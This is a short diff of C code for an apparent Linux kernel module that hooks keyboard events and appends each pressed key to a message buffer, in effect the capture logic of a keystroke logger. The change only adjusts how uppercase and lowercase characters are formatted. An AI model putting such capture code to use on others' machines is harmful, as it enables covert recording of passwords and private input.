@@ -109,10 +109,8 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
             char display_char = key_char[0];
             if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
                 display_char = display_char - 'a' + 'A';  // Convert to uppercase
-                snprintf(message + message_len, BUFFER_SIZE - message_len, "%c", display_char); // Append character
+                snprintf(message + message_len, BUFFER_SIZE - message_len, " %c", display_char); // Append character
             
-            } else if(display_char >= 'a' && display_char <= 'z'){ //character
-                snprintf(message + message_len, BUFFER_SIZE - message_len, "%c", display_char); // Append character
             }
             else{ //special string f.e. "SPACE"
                 snprintf(message + message_len, BUFFER_SIZE - message_len, " %s ", key_char); // Append string without spaces
